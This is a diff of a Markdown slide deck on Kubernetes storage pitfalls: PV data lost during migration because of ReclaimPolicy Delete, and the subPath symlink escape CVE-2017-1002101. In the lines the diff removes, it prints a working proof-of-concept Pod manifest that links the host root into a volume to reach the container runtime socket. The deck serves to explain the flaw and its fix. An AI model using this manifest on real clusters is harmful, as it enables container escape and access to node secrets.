@@ -22,14 +22,12 @@ Red Hat
 
 # Data lost during migration: What?
 1. User moves PV an PVC objects from "testing" to "production" clusters.
-    ```
-    kubectl get pv -o yaml > pvs.yaml
-    kubectl get pvc -o yaml > pvcs.yaml
+    ```shell
+    $ kubectl get pv -o yaml > pvs.yaml
+    $ kubectl get pvc -o yaml > pvcs.yaml
     
-    # + some manual editing / pruning
-    
-    kubectl apply -f pvs.yaml
-    kubectl apply -f pvcs.yaml
+    $ kubectl apply -f pvs.yaml
+    $ kubectl apply -f pvcs.yaml
     ```
 
 2. **Kubernetes deletes PV and the volume in storage backend.**
@@ -41,8 +39,9 @@ Red Hat
 * PV has `ReclaimPolicy: Delete`.
   * *"Delete the volume when this PV is not needed any longer."*
   * *"Any longer"* = PVC does not exist.
-* PVs were restored first!
-  -> `ReclaimPolicy` was executed.
+* PVs were restored with `pv.spec.claimRef.UID`, i.e. as fully bound!
+  * PVC did not exist (yet).
+  * -> `ReclaimPolicy` was executed.
 
 ---
 
@@ -61,42 +60,21 @@ Red Hat
 
 *"Subpath volume mount handling allows arbitrary file access in host filesystem"*
 
-```
-apiVersion: v1
-kind: Pod
-metadata:
-  name: my-pod
-spec:
-  initContainers:
-  - name: init
-    image: busybox
-    command: ["/bin/sh", "-c", "ln -s / /mnt/vol/evil_link"]
-    volumeMounts:
-    - name: share
-      mountPath: /mnt/vol
-  containers:
-  - name: cntr
-    image: busybox
-    command: ["/bin/sh", "-c", "ls -la /mnt/vol/run/docker"]
-    volumeMounts:
-    - name: share
-      mountPath: /mnt/vol
-      subPath: evil_link
-  volumes:
-  - name: share
-    emptyDir:
-```
-TODO: test
+A pod can get access to full host filesystem, including:
+  * Container runtime socket.
+  * Any Secrets present on the node.
+  * Any Pod volume present on the node.
+  * ...
+
+KubeCon NA 2018: [How Symlinks Pwned Kubernetes (And How We Fixed It) - Michelle Au, Google & Jan Šafránek, Red Hat](https://events19.linuxfoundation.org/events/kubecon-cloudnativecon-north-america-2018/schedule/).
 
 ---
 
 # CVE-2017-1002101: Why?
 
-1. Kubernetes tells container runtime to *"make `/var/lib/kubelet/pods/XYZ/volumes/emptydir/evil_link` available as `/mnt/vol` inside the container"*.
-2. Container runtime creates bind-mount.
-3. Kernel resolves the symlink `"evil_link"` -> `"/"`.
-  * In the **host** mount namespace!
-  * Bind-mounting the host's "`/`" into the container!
+Symlinks created *in a pod* were evaluated *outside of the pod*.
+
+* `/mnt/foo` -> `/` has a very different target depending on who is looking.
 
 ---
 
@@ -104,7 +82,7 @@ TODO: test
 
 * Resolve symlinks in a *safe* way.
 * https://github.com/kubernetes/kubernetes/issues/60813
-* KubeCon NA 2018: [*How Symlinks Pwned Kubernetes (And How We Fixed It) - Michelle Au, Google & Jan Šafránek, Red Hat*](https://events19.linuxfoundation.org/events/kubecon-cloudnativecon-north-america-2018/schedule/**.
+* KubeCon NA 2018: [How Symlinks Pwned Kubernetes (And How We Fixed It) - Michelle Au, Google & Jan Šafránek, Red Hat](https://events19.linuxfoundation.org/events/kubecon-cloudnativecon-north-america-2018/schedule/).
 
 ---
 
